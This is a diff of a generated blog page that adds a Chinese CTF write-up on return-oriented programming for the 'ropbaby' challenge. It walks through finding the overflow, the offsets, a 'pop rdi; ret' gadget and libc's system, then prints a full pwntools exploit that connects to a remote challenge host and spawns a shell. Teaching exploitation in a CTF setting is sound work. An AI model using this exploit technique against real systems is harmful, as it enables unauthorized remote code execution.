@@ -6,15 +6,34 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | 怪咖的小屋</title>
+  <title>怪咖的小屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="ROP (Return-oriented programming ) 返回导向编程 ROP (Return-oriented programming ) 返回导向编程以实验吧 ropbaby为例：简单的栈溢出利用，NX开了，那么就要用ROP了；开了PIE，就要想办法泄露出libc的基址，但这道题比较友好。 那么利用思路就很简单了：寻找可以利用的ret，将栈布局为：无效字段*offset+p64(a">
+<meta property="og:type" content="article">
 <meta property="og:title" content="怪咖的小屋">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/index.html">
 <meta property="og:site_name" content="怪咖的小屋">
+<meta property="og:description" content="ROP (Return-oriented programming ) 返回导向编程 ROP (Return-oriented programming ) 返回导向编程以实验吧 ropbaby为例：简单的栈溢出利用，NX开了，那么就要用ROP了；开了PIE，就要想办法泄露出libc的基址，但这道题比较友好。 那么利用思路就很简单了：寻找可以利用的ret，将栈布局为：无效字段*offset+p64(a">
 <meta property="og:locale" content="zh">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/d514bf7df4e170521042293fdc69e3d7.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/79671673cb3dbdc18b17630713a6fa10.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/ee6566df7256098be4ab03686b8a9c8a.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/bc4a38b47b5fb2858aa7c89ae1d80697.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/c8dbb3b018a921c371b140115253b52f.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/09c4d08f7fb7e50ef331935c777cf403.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/d9ce806250e3ab925ac3fbba9336c63a.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/2f1da7027901200e157d3edb9908815f.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/5a73527385c79cd9bcbd0bc832ebaa92.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/b476dafead58d72a02f5a03b4ad48d63.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/d7c675fffc61a43ce0238648eb20d885.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/cdc3b8cb24f2db99e422c98cba4c2cd4.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/638d973dde12d491bf623f5a33a56383.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/af92467f178d1d29a856801aace8c2ef.png">
+<meta property="og:updated_time" content="2019-09-10T08:58:12.529Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="怪咖的小屋">
+<meta name="twitter:description" content="ROP (Return-oriented programming ) 返回导向编程 ROP (Return-oriented programming ) 返回导向编程以实验吧 ropbaby为例：简单的栈溢出利用，NX开了，那么就要用ROP了；开了PIE，就要想办法泄露出libc的基址，但这道题比较友好。 那么利用思路就很简单了：寻找可以利用的ret，将栈布局为：无效字段*offset+p64(a">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/10/PWN/ROP%20(Return-oriented%20programming%20)%20返回导向编程/_resources/d514bf7df4e170521042293fdc69e3d7.png">
   
     <link rel="alternative" href="/atom.xml" title="怪咖的小屋" type="application/atom+xml">
   
@@ -146,235 +165,164 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-PWN/ROP (Return-oriented programming ) 返回导向编程" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>ROP (Return-oriented programming ) 返回导向编程</p>
+<h3 id="ROP-Return-oriented-programming-返回导向编程"><a href="#ROP-Return-oriented-programming-返回导向编程" class="headerlink" title="ROP (Return-oriented programming ) 返回导向编程"></a><strong>ROP (Return-oriented programming ) 返回导向编程</strong></h3><p>以<strong>实验吧 ropbaby</strong>为例：<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/d514bf7df4e170521042293fdc69e3d7.png" alt><br>简单的栈溢出利用，NX开了，那么就要用ROP了；开了PIE，就要想办法泄露出libc的基址，但这道题比较友好。<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/79671673cb3dbdc18b17630713a6fa10.png" alt></p>
+<p>那么<strong>利用思路</strong>就很简单了：寻找可以利用的ret，将栈布局为：无效字段*offset+p64(addr_ret)+p64(‘/bin/sh’)+p64(‘addr_system’)</p>
+<p>在memcpy完想要ret时，会ret到addr_ret的地址，然后将’/bin/sh’pop出来当作参数，在下一个ret时，ret到addr_system这里，因为已经布局好了其参数’/bin/sh’，所以相当于执行system(‘/bin/sh’)，拿到shell.</p>
+<p>首先<strong>寻找溢出点</strong>：<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/ee6566df7256098be4ab03686b8a9c8a.png" alt><br>经过验证,将nptr复制给savedregs时会发生溢出。<br>接着<strong>查找可控字段，计算偏移量</strong>。<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/bc4a38b47b5fb2858aa7c89ae1d80697.png" alt><br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/c8dbb3b018a921c371b140115253b52f.png" alt><br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/09c4d08f7fb7e50ef331935c777cf403.png" alt><br>偏移量为8<br>验证如下：<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/d9ce806250e3ab925ac3fbba9336c63a.png" alt><br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/2f1da7027901200e157d3edb9908815f.png" alt><br><strong>寻找libc中’/bin/sh’的偏移量</strong>(在32位机器上可以找到，我也不知道为什么64位不行)<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/5a73527385c79cd9bcbd0bc832ebaa92.png" alt><br>offset_binsh = 0x18cd17<br>接着需要<strong>查找所有的 ret</strong>，使用ROPgadget(32位可以，64不知道为什么不行)<br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/b476dafead58d72a02f5a03b4ad48d63.png" alt><br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/d7c675fffc61a43ce0238648eb20d885.png" alt></p>
+<p><strong>注意：</strong>64位参数先以寄存器为主，分别是rdi,rsi,rdx,rcx,r8,r9,栈；32位只有栈。该程序是64位，之后的system(‘/bin/sh’)只有一个参数，入rdi寄存器，所以找相应的指令:pop rdi;ret;</p>
+<p><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/cdc3b8cb24f2db99e422c98cba4c2cd4.png" alt><br>那么offset_rdi_ret = 0x21102<br><strong>拿到offset_system</strong><br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/638d973dde12d491bf623f5a33a56383.png" alt><br>利用2可以拿到addr_system，然后addr_libc就可以计算出来了。</p>
+<p><strong>exp如下：</strong><br>from  pwn  import  *</p>
+<p>def  pwn():<br>    s  =  remote(“106.2.25.7”,  8004)<br>    print  ‘[<em>] Start!’<br>    s.recvuntil(‘:’)<br>    #Get addr_system<br>    s.sendline(‘2’)<br>    s.recvuntil(‘Enter symbol: ‘)<br>    s.sendline(‘system’)<br>    addr_system  =  int  (s.recvuntil(‘\n’)[14:],16)<br>    print  ‘[</em>] addr_system is ‘,addr_system<br>    offset_system  =  0x45390<br>    #Calculate addr_libc<br>    addr_libc  =  addr_system  -  offset_system<br>    #Make payload<br>    s.sendline(‘3’)<br>    s.recvuntil(‘(max 1024): ‘)<br>    #8 + 8 + 8 + 8 =32<br>    s.sendline(‘32’)<br>    offset_binsh  =  0x18cd17<br>    offset_rdi_ret  =  0x21102<br>    addr_rdi_ret  =  addr_libc  +  offset_rdi_ret<br>    addr_binsh  =  addr_libc  +  offset_binsh<br><br>    payload  =’A’  *  8  +  p64(addr_rdi_ret)  +  p64(addr_binsh)  +  p64(addr_system)<br><br>    s.sendline(payload)<br>    s.interactive()</p>
+<p>def  main():<br>    pwn()</p>
+<p>if  <strong>name</strong>  ==  ‘<strong>main</strong>‘:<br>    main()<br><strong>运行结果如下：</strong><br><img src="/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/_resources/af92467f178d1d29a856801aace8c2ef.png" alt="1534153380698.png"></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>感觉还不错的话就嘿嘿嘿吧<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Reverse/输入表重建工具ImportREC/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.709Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/10/PWN/ROP (Return-oriented programming ) 返回导向编程/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python网络编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.693Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python字符串开头b r u含义/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.677Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+<nav id="article-nav">
+  
+    <a href="/2019/09/10/PWN/Pythonpwn使用方法/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/09/10/PWN/Pwnable.tw.start/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Pythonpexpect/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.660Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python z3-solver/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.643Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
+        
+        
+    </div>
+</aside>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python binascii模块/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.627Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/PythonPIL简单编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.609Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/PythonHash/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.592Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/Python/Python 邮件编程/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.575Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/PWN/格式化字符串漏洞利用/" class="archive-article-date">
-  	<time datetime="2019-09-10T08:58:12.559Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        </div>
-    	 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
   
 
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-    </nav>
+  
+
+  
+
   
 
 
@@ -398,8 +346,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
